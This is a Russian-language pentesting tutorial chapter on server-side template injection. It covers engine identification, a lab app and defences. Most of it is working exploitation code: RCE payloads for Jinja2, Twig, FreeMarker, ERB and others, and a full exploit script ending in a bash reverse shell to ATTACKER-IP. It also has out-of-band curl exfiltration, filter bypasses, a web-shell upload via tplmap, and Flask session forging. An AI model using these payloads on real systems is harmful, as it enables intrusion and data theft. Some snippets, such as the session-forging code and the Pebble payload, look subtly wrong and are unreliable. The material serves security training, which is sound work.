# Глава 14.2: SSTI — Server-Side Template Injection

## 🎯 Цели главы

- Понять природу SSTI и отличить его от XSS (Client-Side Template Injection)
- Научиться идентифицировать шаблонизатор по поведению приложения
- Освоить дерево решений для определения типа шаблонизатора
- Выполнить пошаговую эксплуатацию Jinja2 SSTI до Remote Code Execution
- Выполнить эксплуатацию Twig SSTI в PHP Symfony/Laravel
- Использовать tplmap для автоматического обнаружения и эксплуатации
- Знать методы защиты и их реализацию

---

## 14.2.1 Что такое SSTI

Server-Side Template Injection (SSTI) — это уязвимость, при которой пользовательский ввод встраивается непосредственно в шаблон и выполняется на стороне сервера движком шаблонов.

### Разница между SSTI и XSS

```
XSS (Client-Side):
  Ввод → HTML-ответ → Браузер интерпретирует → JavaScript выполняется у пользователя

SSTI (Server-Side):
  Ввод → Шаблон → Сервер компилирует → Код выполняется НА СЕРВЕРЕ
                                         ↓
                               Доступ к файловой системе,
                               переменным окружения,
                               выполнение системных команд!
```

### Почему возникает SSTI

**Уязвимый код (Python/Jinja2):**
```python
# НЕПРАВИЛЬНО — уязвимость SSTI
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # Пользовательский ввод встраивается в строку шаблона
    template = f"<h1>Hello, {name}!</h1>"
    return render_template_string(template)  # ОПАСНО!
```

```python
# ПРАВИЛЬНО — безопасное использование
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # Имя передаётся как ПЕРЕМЕННАЯ, а не встраивается в шаблон
    template = "<h1>Hello, {{ name }}!</h1>"
    return render_template_string(template, name=name)  # БЕЗОПАСНО
```

### В каких фреймворках встречается SSTI

| Язык       | Шаблонизатор    | Фреймворк               | Риск |
|------------|-----------------|-------------------------|------|
| Python     | Jinja2          | Flask, Django           | RCE  |
| Python     | Mako            | Pyramid                 | RCE  |
| Python     | Tornado         | Tornado                 | RCE  |
| PHP        | Twig            | Symfony, Laravel        | RCE  |
| PHP        | Smarty          | Старые PHP-приложения   | RCE  |
| PHP        | Blade           | Laravel                 | RCE  |
| Java       | FreeMarker      | Spring MVC              | RCE  |
| Java       | Velocity        | Apache Velocity         | RCE  |
| Java       | Thymeleaf       | Spring Boot             | RCE  |
| JS         | Pug (Jade)      | Express.js              | RCE  |
| JS         | Handlebars      | Express.js              | XSS  |
| Ruby       | ERB             | Rails                   | RCE  |

---

## 14.2.2 Идентификация шаблонизатора

### Базовые тест-строки

Первый шаг — определить, есть ли вообще интерпретация шаблона:

```
# Тест 1: математика
{{7*7}}          → Ожидаем: 49 (если шаблонизатор работает)
${7*7}           → Ожидаем: 49 (FreeMaker, Velocity)
#{7*7}           → Ожидаем: 49 (Pebble)
*{7*7}           → Ожидаем: 49 (Spring EL)

# Тест 2: строки
{{'abc'|upper}}  → Ожидаем: ABC (Jinja2/Twig)
{{7*'7'}}        → Ожидаем: 7777777 (Jinja2) или 49 (Twig)
```

### Decision Tree — Дерево принятия решений

```
                         НАЧАЛО
                            |
                     Ввести: {{7*7}}
                            |
              .-------------+-------------.
              |                           |
           Вывод: 49                  Нет вывода/
              |                       ошибка/{{7*7}}
              |                           |
    .----------+---------.         Ввести: ${7*7}
    |                    |                |
{{7*'7'}}         Ввести:          .------+------.
результат?        {7*7}            |              |
    |                |           Вывод: 49    Нет вывода
    |           .----+----.         |              |
    |           |         |      FreeMarker    Ввести: #{7*7}
7777777         49    Нет вывода  или Velocity    |
    |           |         |                  .----+----.
  Jinja2     Twig    Возможно:             49      Нет
    |           |    Smarty,Pebble         |         |
    |           |    или нет SSTI        Pebble    Нет SSTI
    |           |                       или JEXL
    |           |
    |     (Twig подтверждён!)
    |
(Jinja2 подтверждён!)
```

### Таблица идентификации по payload

| Payload | Jinja2 | Twig | FreeMarker | Velocity | Smarty |
|---------|--------|------|------------|----------|--------|
| `{{7*7}}` | 49 | 49 | Error | `{{7*7}}` | `{{7*7}}` |
| `${7*7}` | `${7*7}` | `${7*7}` | 49 | 49 | 49 |
| `{{7*'7'}}` | 7777777 | 49 | - | - | - |
| `{{'a'.toUpperCase()}}` | Error | Error | Error | a | Error |
| `{{ range(10) }}` | [0..9] | Error | Error | Error | Error |
| `a{*comment*}b` | ab | Error | ab | Error | Error |

### Burp Suite Intruder для идентификации

```
Настройка Intruder для автоматической идентификации:

1. Перехватите запрос с параметром
2. Send to Intruder
3. Positions: отметьте значение параметра как позицию
4. Payload type: Simple list
5. Payloads:
   {{7*7}}
   ${7*7}
   #{7*7}
   {{7*'7'}}
   {7*7}
   <%= 7*7 %>
   {{config}}
   ${class.getResource('')}
   
6. Запустите и ищите ответы с "49" или "7777777"
```

---

## 14.2.3 Jinja2 SSTI → RCE: Пошаговая эксплуатация

### Контекст

Jinja2 используется в Flask (Python). Движок предоставляет доступ к Python-объектам через синтаксис `{{ }}` и `{% %}`.

### Шаг 1: Подтверждение SSTI

```
GET /hello?name={{7*7}} HTTP/1.1
Host: flask-app.com

Ответ: Hello, 49!  ← Подтверждение SSTI!
```

### Шаг 2: Исследование доступных объектов

```python
# Jinja2 предоставляет глобальные объекты:
# config    - объект конфигурации Flask
# request   - текущий HTTP-запрос
# session   - объект сессии
# g         - глобальный контекст запроса
# self      - текущий объект шаблона

# Пробуем получить конфиг (может содержать SECRET_KEY!)
GET /hello?name={{config}}
# Ответ: <Config {'DEBUG': True, 'SECRET_KEY': 'super-secret-key-123', ...}>

GET /hello?name={{config.items()}}
# Ответ: dict_items([('DEBUG', True), ('SECRET_KEY', '...')])
```

### Шаг 3: Путь к RCE через Python object introspection

В Python каждый объект имеет атрибуты `__class__`, `__mro__`, `__subclasses__` и т.д. Через эти атрибуты можно "добраться" до системных функций.

```python
# Цепочка к RCE - объяснение каждого шага:

# 1. Получаем тип строки
''.__class__
# → <class 'str'>

# 2. Получаем все базовые классы (Method Resolution Order)
''.__class__.__mro__
# → (<class 'str'>, <class 'object'>)

# 3. Берём базовый класс object
''.__class__.__mro__[1]
# → <class 'object'>

# 4. Получаем ВСЕ подклассы object (их много!)
''.__class__.__mro__[1].__subclasses__()
# → [<class 'type'>, <class 'weakref'>, ..., <class 'subprocess.Popen'>, ...]

# 5. Находим индекс subprocess.Popen
# (индекс зависит от версии Python!)
```

**Поиск индекса subprocess.Popen:**
```python
# URL: /hello?name={{ ''.__class__.__mro__[1].__subclasses__() }}
# Получаем список всех подклассов
# Ищем 'Popen' в ответе

# Или используем фильтр:
# /hello?name={{ ''.__class__.__mro__[1].__subclasses__() | selectattr('__name__', 'eq', 'Popen') | list }}
```

### Шаг 4: Различные пути к RCE

**Путь 1: Через subprocess.Popen**
```python
# Найти индекс Popen (например, 408 для Python 3.9)
{{''.__class__.__mro__[1].__subclasses__()[408]('id', shell=True, stdout=-1).communicate()}}

# Универсальный вариант (поиск Popen по имени)
{% for cls in ''.__class__.__mro__[1].__subclasses__() %}
  {% if cls.__name__ == 'Popen' %}
    {{ cls('id', shell=True, stdout=-1).communicate() }}
  {% endif %}
{% endfor %}
```

**Путь 2: Через os модуль**
```python
# Через config.from_envvar или другие точки
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Через request globals
{{request.application.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

**Путь 3: Через builtins (универсальный)**
```python
# Получить доступ к __builtins__ через любую функцию
{{().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['__builtins__']['__import__']('os').system('id')}}

# Более читаемый вариант через lipsum
{{lipsum.__globals__['os'].popen('id').read()}}
```

**Путь 4: Через request.environ**
```python
# Через переменные окружения WSGI
{{request.environ['werkzeug.server.shutdown']()}}  # Только Werkzeug dev server

# Чтение файлов через os
{{request.environ.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

### Полная цепочка эксплуатации

```python
#!/usr/bin/env python3
"""
Jinja2 SSTI Exploiter - пошаговая эксплуатация
"""
import requests
from urllib.parse import quote

TARGET = "http://flask-app.com/hello?name="

def test_ssti(payload):
    """Отправить payload и вернуть результат"""
    r = requests.get(TARGET + quote(payload))
    return r.text

# Шаг 1: Подтверждение
result = test_ssti("{{7*7}}")
if "49" in result:
    print("[+] SSTI подтверждён!")
else:
    print("[-] SSTI не обнаружен")
    exit()

# Шаг 2: Утечка конфига
config = test_ssti("{{config.items()}}")
print(f"[+] Config: {config[:500]}")

# Шаг 3: Поиск RCE через lipsum (работает в большинстве Flask-приложений)
rce_payload = "{{lipsum.__globals__['os'].popen('id').read()}}"
result = test_ssti(rce_payload)
print(f"[+] Результат id: {result}")

# Шаг 4: Чтение /etc/passwd
passwd = test_ssti("{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}")
print(f"[+] /etc/passwd:\n{passwd}")

# Шаг 5: Reverse shell
import base64
cmd = "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"
b64_cmd = base64.b64encode(cmd.encode()).decode()
revshell = f"{{{{lipsum.__globals__['os'].popen('echo {b64_cmd} | base64 -d | bash').read()}}}}"
print(f"[*] Запускаем reverse shell...")
test_ssti(revshell)
```

### Обход фильтров в Jinja2

```python
# Если '_' заблокирован:
# Использовать unicode
{{request|attr('\x5f\x5fclass\x5f\x5f')}}

# Если '.' заблокирован:
# Использовать [] нотацию
{{request['__class__']}}

# Если 'config' заблокирован:
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Если пробелы заблокированы:
{{config/*comment*/}}
{%if(1==1)%}yes{%endif%}

# Если кавычки заблокированы:
# Использовать request.args для передачи строк
?name={{lipsum.__globals__.os.popen(request.args.cmd).read()}}&cmd=id

# Encode через chr()
{{""["\x5f\x5fclass\x5f\x5f"]}}
```

---

## 14.2.4 Twig SSTI → RCE (PHP Symfony/Laravel)

### Что такое Twig

Twig — шаблонизатор для PHP, используемый в Symfony и (через Blade-адаптер) в Laravel. Синтаксис похож на Jinja2, но работает в PHP-среде.

### Идентификация Twig

```
# Тест 1
{{7*7}}     → 49 (как Jinja2)
{{7*'7'}}   → 49 (ОТЛИЧИЕ от Jinja2: Twig возвращает 49, а не 7777777)

# Тест 2: Twig-специфичные фильтры
{{'abc'|capitalize}}  → Abc
{{'a'|upper}}         → A

# Тест 3: Twig-специфичные функции  
{{_self}}             → объект шаблона Twig
{{dump(app)}}         → дамп объекта app (если debug включён)
```

### Twig RCE — Базовая эксплуатация

```php
// Стандартный Twig не позволяет вызывать системные функции напрямую
// Но есть несколько векторов:

// Вектор 1: Через _self (доступ к среде Twig)
{{_self.env.registerUndefinedFilterCallback('exec')}}
{{_self.env.getFilter('id')}}

// Вектор 2: Через PHP-функции (если разрешено)
{{['id']|filter('system')}}
{{['id']|map('system')}}

// Вектор 3: Через setHandler (Twig 1.x)
{{_self.env.setCache('ftp://attacker.com')}}
{{_self.env.loadTemplate('exploit')}}
```

### Полная цепочка Twig RCE

**Symfony-специфичный вектор:**
```php
# Twig 1.x - прямой вызов через filterCallback
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
# Вывод: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Чтение файла
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("cat /etc/passwd")}}
```

**Laravel/Blade SSTI:**
```php
// Blade использует PHP-синтаксис
// Если eval доступен:
{{eval('system("id");')}}

// Через PHP-функции:
{!! system('id') !!}    // Blade не экранирует {!! !!}

// Через phpinfo:
{{phpinfo()}}
```

**Twig с доступом к PHP Object Injection:**
```php
// Если Twig обрабатывает пользовательские объекты
class EvilObject {
    public function __toString() {
        system('id');
        return '';
    }
}

// В шаблоне:
{{ evilObject }}  // Вызовет __toString → system()
```

### Twig payload шпаргалка

```
# Базовое подтверждение
{{7*7}}                                  → 49

# Чтение переменных среды
{{app.request.server.get('PATH')}}       → /usr/local/sbin:/usr/local/bin:...

# Доступ к env в Symfony
{{app.request.server.all()}}            → все $_SERVER переменные

# Чтение файла через PHP (если разрешено)
{{'/etc/passwd'|file_excerpt(1,10)}}    → первые 10 строк

# RCE через registerUndefinedFilterCallback (Twig < 2.x)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# RCE через map/filter (если PHP-функции доступны)
{{["id"]|map("system")}}

# RCE reverse shell
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'")}}
```

---

## 14.2.5 Другие шаблонизаторы

### FreeMarker (Java)

```java
// Базовое подтверждение
${7*7}     → 49
${7*'7'}   → Error (Java сильная типизация)

// RCE через freemarker.template.utility.Execute
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

// RCE через freemarker.template.utility.ObjectConstructor
<#assign obj="freemarker.template.utility.ObjectConstructor"?new()>
${obj("java.lang.ProcessBuilder", ["id"]).start().text}

// Чтение файла
<#assign is=object("java.io.FileInputStream", "/etc/passwd")>
<#assign is_reader=object("java.io.BufferedReader", object("java.io.InputStreamReader", is))>
${is_reader.readLine()}
```

### Velocity (Java)

```java
// Базовое подтверждение
${7*7}    → 49 (как FreeMarker)
#set($x=7*7) $x → 49

// RCE через Runtime
#set($runtime = $class.inspect("java.lang.Runtime").type)
#set($process = $runtime.exec("id"))
#set($inputStream = $process.getInputStream())
#set($reader = $class.inspect("java.io.BufferedReader").initialize($class.inspect("java.io.InputStreamReader").initialize($inputStream)))
$reader.readLine()
```

### ERB (Ruby on Rails)

```ruby
# Базовое подтверждение
<%= 7*7 %>   → 49

# RCE
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>

# Чтение файла
<%= File.read('/etc/passwd') %>

# Reverse shell
<%= require 'socket'; s=TCPSocket.new('ATTACKER',4444); 
    [0,1,2].each{|fd| s.to_io.reopen(fd)}; exec "/bin/sh" %>
```

### Pebble (Java)

```java
// Базовое подтверждение
#{7*7}    → 49

// RCE
{%set s = "freemarker.template.utility.Execute"?new()%}${s("id")}
// или:
{{beans.get("freemarker.template.utility.Execute").exec("id")}}
```

---

## 14.2.6 Инструмент tplmap

### Установка и настройка

```bash
# Клонирование
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Установка зависимостей
pip3 install -r requirements.txt

# Проверка
python3 tplmap.py --help
```

### Основные параметры tplmap

```
Использование: tplmap.py [опции] -u <url>

Опции:
  -u URL          Целевой URL
  -d DATA         POST-данные
  -H HEADER       Добавить заголовок
  -c COOKIE       Cookie
  -p PARAM        Параметр для тестирования (по умолчанию: все)
  --engine ENGINE Принудительно указать движок
  --os-cmd CMD    Выполнить команду
  --os-shell      Интерактивный shell
  --upload SRC    Загрузить файл на сервер
  --download SRC  Скачать файл с сервера
  --bind-shell    Открыть bind shell на сервере
  --reverse-shell Открыть reverse shell (ip:port)
```

### Практические примеры

```bash
# Базовое сканирование GET-параметра
python3 tplmap.py -u 'http://target.com/hello?name=test'

# Сканирование POST-параметра
python3 tplmap.py -u 'http://target.com/api' \
  -d 'username=admin&template=test'

# Сканирование конкретного параметра в POST
python3 tplmap.py -u 'http://target.com/api' \
  -d 'username=admin&template=test' \
  -p template

# С Cookie и заголовком
python3 tplmap.py \
  -u 'http://target.com/dashboard?msg=hello' \
  -c 'session=abc123' \
  -H 'X-Forwarded-For: 127.0.0.1'

# Выполнить команду после обнаружения
python3 tplmap.py -u 'http://target.com/hello?name=test' \
  --os-cmd 'id'

# Открыть интерактивный shell
python3 tplmap.py -u 'http://target.com/hello?name=test' \
  --os-shell

# Скачать файл
python3 tplmap.py -u 'http://target.com/hello?name=test' \
  --download /etc/passwd /tmp/passwd.txt

# Загрузить файл (например, веб-шелл)
python3 tplmap.py -u 'http://target.com/hello?name=test' \
  --upload /tmp/shell.php /var/www/html/shell.php

# Форсировать движок Jinja2
python3 tplmap.py -u 'http://target.com/hello?name=test' \
  --engine Jinja2
```

### Интерпретация вывода tplmap

```
[+] tplmap 0.5
    Loaded 21 template injection plugins

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '{{*comment*}}'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python2 code
```

---

## 14.2.7 Продвинутые техники SSTI

### Слепой SSTI (Blind SSTI)

Когда вывод шаблона не отображается в ответе:

```python
# Метод 1: Out-of-band через DNS
{{lipsum.__globals__['os'].popen('curl http://BURP-COLLABORATOR-ID.oastify.com/?data=$(id|base64)').read()}}

# Метод 2: Задержка времени
{{lipsum.__globals__['os'].popen('sleep 5').read()}}

# Метод 3: Запись файла
{{lipsum.__globals__['os'].popen('echo "test" > /var/www/html/ssti.txt').read()}}
# Потом проверить: curl http://target.com/ssti.txt
```

### Атака на сессионные токены Flask

Если SECRET_KEY утёк через SSTI — можно подделать сессию:

```python
#!/usr/bin/env python3
"""
Подделка Flask сессии через утёкший SECRET_KEY
"""
import json
import base64
import hmac
import hashlib
from datetime import datetime

def forge_flask_session(secret_key: str, payload: dict) -> str:
    """Создание поддельного Flask session cookie"""
    
    # Сериализация данных
    json_data = json.dumps(payload, separators=(',', ':'))
    b64_data = base64.b64encode(json_data.encode()).decode()
    
    # Timestamp
    timestamp = int(datetime.now().timestamp())
    b64_timestamp = base64.b64encode(timestamp.to_bytes(4, 'big')).decode().rstrip('=')
    
    # Собираем части
    cookie_data = f"{b64_data}.{b64_timestamp}"
    
    # HMAC подпись
    sig = hmac.new(
        secret_key.encode(),
        cookie_data.encode(),
        hashlib.sha1
    ).digest()
    b64_sig = base64.b64encode(sig).decode().rstrip('=')
    
    return f"{cookie_data}.{b64_sig}"

# Использование
secret = "super-secret-key-123"  # Утёк через SSTI
forged = forge_flask_session(secret, {"user_id": 1, "is_admin": True})
print(f"Поддельная сессия: {forged}")

# Или используем flask-unsign:
# pip install flask-unsign
# flask-unsign --sign --cookie "{'is_admin': True}" --secret 'super-secret-key-123'
```

### SSTI через Headers

```bash
# SSTI может быть в заголовках, не только в параметрах!

# User-Agent
curl 'http://target.com/' \
  -H 'User-Agent: {{7*7}}'

# Referer
curl 'http://target.com/' \
  -H 'Referer: {{config}}'

# X-Custom-Header
curl 'http://target.com/' \
  -H 'X-Display-Name: {{lipsum.__globals__["os"].popen("id").read()}}'
```

---

## 14.2.8 Защита от SSTI

### 1. Никогда не встраивать пользовательский ввод в шаблон

```python
# НЕПРАВИЛЬНО
template_string = f"Hello, {user_input}!"
render_template_string(template_string)

# ПРАВИЛЬНО
render_template_string("Hello, {{ name }}!", name=user_input)
```

### 2. Использование Sandbox

**Jinja2 Sandbox:**
```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("Hello, {{ name }}!")

# SandboxedEnvironment ограничивает доступ к опасным методам
# НО: sandbox можно обойти через некоторые хитрые payloads!
result = template.render(name=user_input)
```

**Twig Sandbox:**
```php
use Twig\Environment;
use Twig\Sandbox\SecurityPolicy;
use Twig\Extension\SandboxExtension;

$tags = ['if', 'for'];
$filters = ['upper', 'lower'];
$methods = [];
$properties = [];
$functions = ['range'];

$policy = new SecurityPolicy($tags, $filters, $methods, $properties, $functions);
$sandbox = new SandboxExtension($policy, true); // true = sandbox всегда активен
$twig->addExtension($sandbox);
```

### 3. Input Validation

```python
import re

def validate_template_input(user_input: str) -> bool:
    """Проверка пользовательского ввода на опасные шаблонные конструкции"""
    
    # Запрещённые паттерны
    dangerous_patterns = [
        r'\{\{.*\}\}',      # {{ ... }}
        r'\{%.*%\}',        # {% ... %}
        r'\$\{.*\}',        # ${ ... }
        r'#\{.*\}',         # #{ ... }
        r'<%.*%>',          # <% ... %>
        r'__class__',       # Python introspection
        r'__mro__',
        r'__subclasses__',
        r'__globals__',
        r'__builtins__',
        r'popen|system|exec|eval|compile',
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, user_input, re.DOTALL | re.IGNORECASE):
            return False
    
    return True

# Использование
user_input = request.args.get('name', '')
if not validate_template_input(user_input):
    abort(400, "Invalid input")
```

### 4. Escape пользовательского ввода

```python
from markupsafe import escape

# Flask автоматически экранирует переменные в шаблонах
# Но убедитесь, что не используете |safe фильтр с пользовательским вводом!

# ОПАСНО
return render_template("page.html", content=user_content | safe)

# БЕЗОПАСНО (автоэкранирование)
return render_template("page.html", content=user_content)
```

### 5. Использование безопасных API

```python
# Вместо render_template_string с пользовательским вводом
# Используйте параметризованные шаблоны

# ПЛОХО: динамическое создание шаблона
template = f"Hello {name}, your score is {score}"
render_template_string(template)

# ХОРОШО: статический шаблон с переменными
# templates/hello.html:
# <h1>Hello {{ name }}, your score is {{ score }}</h1>
render_template("hello.html", name=name, score=score)
```

### Чеклист защиты от SSTI

```
[ ] Никогда не создавать шаблоны из пользовательского ввода
[ ] Использовать параметры шаблона вместо конкатенации строк
[ ] Включить sandbox для Jinja2/Twig если нужны пользовательские шаблоны
[ ] Валидировать ввод на наличие шаблонных конструкций
[ ] Не использовать |safe с непроверенными данными
[ ] Обновлять шаблонизаторы до актуальных версий
[ ] Запускать приложение с минимальными привилегиями
[ ] Мониторинг: логировать ошибки шаблонизатора как инциденты
```

---

## 14.2.9 Практика: PortSwigger Academy SSTI Лабораторные

### Lab 1: Basic SSTI

**URL:** `https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic`

**Задача:** Удалить файл `/home/carlos/morale.txt`

```bash
# Шаг 1: Найти точку инъекции
# Ищите параметры в URL: ?message=, ?template=, ?name=

# Шаг 2: Тест
GET /?message={{7*7}}
# Ожидаем: 49 в ответе

# Шаг 3: Определить движок
GET /?message={{7*'7'}}
# 7777777 → Jinja2
# 49      → Twig

# Шаг 4: RCE
# Jinja2:
GET /?message={{lipsum.__globals__['os'].popen('rm /home/carlos/morale.txt').read()}}

# Twig:
GET /?message={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
```

### Lab 2: SSTI — Documentation Context

**Задача:** Эксплуатировать SSTI в Tornado (Python)

```python
# Tornado шаблонизатор
# Синтаксис: {{ expression }} и {% block %}

# Тест
GET /?name={{1+1}}   → 2

# RCE через Tornado
GET /?name={%import os%}{{os.popen("id").read()}}

# Чтение файла
GET /?name={%import os%}{{os.popen("cat /home/carlos/morale.txt").read()}}
```

### Lab 3: FreeMarker SSTI

```java
// Тест
GET /?name=${7*7}   → 49

// RCE
GET /?name=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

// Удаление файла
GET /?name=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}
```

### Lab 4: Unknown Template Engine

```bash
# Шаг 1: Систематический перебор
{{7*7}}    → error
${7*7}     → error  
#{7*7}     → 49! → возможно Pebble или Spring EL

# Шаг 2: Уточнение
#{"abc"}   → abc → подтверждение Pebble

# RCE в Pebble
{{ variable.getClass().forName('java.lang.Runtime').getMethod('exec',''.class).invoke(variable.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id') }}
```

---

## 14.2.10 Практические упражнения

### Упражнение 1: Развертывание уязвимой лаборатории

```bash
# Flask-приложение с Jinja2 SSTI
cat > /tmp/ssti_lab.py << 'EOF'
from flask import Flask, request, render_template_string

app = Flask(__name__)
app.secret_key = "very-secret-key-for-lab"

@app.route('/')
def index():
    name = request.args.get('name', 'World')
    # УЯЗВИМОСТЬ: пользовательский ввод в шаблоне
    template = f'''
    <html>
    <body>
    <h1>Hello, {name}!</h1>
    <p>Try adding ?name=World to the URL</p>
    </body>
    </html>
    '''
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True, port=5000)
EOF

pip3 install flask
python3 /tmp/ssti_lab.py &

# Тест
curl 'http://localhost:5000/?name={{7*7}}'
# Ожидаем: Hello, 49!
```

### Упражнение 2: Ручная эксплуатация Jinja2

```bash
# 1. Подтверждение SSTI
curl -s 'http://localhost:5000/?name={{7*7}}'

# 2. Утечка конфига (в т.ч. SECRET_KEY)
curl -s 'http://localhost:5000/?name={{config}}'

# 3. Получение списка подклассов
curl -s "http://localhost:5000/?name={{''.__class__.__mro__[1].__subclasses__()}}"

# 4. RCE через lipsum
curl -s "http://localhost:5000/?name={{lipsum.__globals__['os'].popen('id').read()}}"

# 5. Чтение /etc/passwd
curl -s "http://localhost:5000/?name={{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}"
```

### Упражнение 3: Использование tplmap

```bash
# Сканирование лаборатории
python3 tplmap.py -u 'http://localhost:5000/?name=test'

# Выполнение команды
python3 tplmap.py -u 'http://localhost:5000/?name=test' --os-cmd 'id'

# Интерактивный shell
python3 tplmap.py -u 'http://localhost:5000/?name=test' --os-shell
```

### Упражнение 4: PHP Twig лаборатория

```bash
# Запустить через Docker
docker run -d \
  --name twig-lab \
  -p 8080:80 \
  php:7.4-apache

# Или создать вручную:
cat > /tmp/twig_test.php << 'EOF'
<?php
require 'vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello {{ name }}!',
]);
$twig = new \Twig\Environment($loader);

$name = $_GET['name'] ?? 'World';
// УЯЗВИМОСТЬ: создание шаблона из ввода
$template = $twig->createTemplate("Hello $name!");
echo $template->render([]);
?>
EOF
```

### Упражнение 5: CTF-задание (самостоятельное)

```
Дано: Flask-приложение с формой обратной связи
Задача: 
1. Найти точку SSTI
2. Определить шаблонизатор
3. Получить содержимое /etc/passwd
4. Прочитать SECRET_KEY приложения
5. Подделать сессию с is_admin=True

Подсказки:
- Проверьте все input-поля формы
- Проверьте заголовки запроса (User-Agent, Referer)
- Используйте burp intruder с wordlist SSTI-payload
```

---

## Итоги главы

### Краткая шпаргалка SSTI

```
Определение шаблонизатора:
  {{7*7}} → 49? → Jinja2 или Twig
    {{7*'7'}} → 7777777? → Jinja2
    {{7*'7'}} → 49?      → Twig
  ${7*7} → 49? → FreeMarker или Velocity
  #{7*7} → 49? → Pebble или JEXL
  
Быстрые RCE:
  Jinja2:    {{lipsum.__globals__['os'].popen('CMD').read()}}
  Twig:      {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("CMD")}}
  FreeMarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("CMD")}
  ERB:       <%= `CMD` %>
  
Автоматизация: tplmap.py -u URL --os-shell
```

### Дополнительные ресурсы

- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [tplmap GitHub](https://github.com/epinna/tplmap)
- [PortSwigger SSTI Labs](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
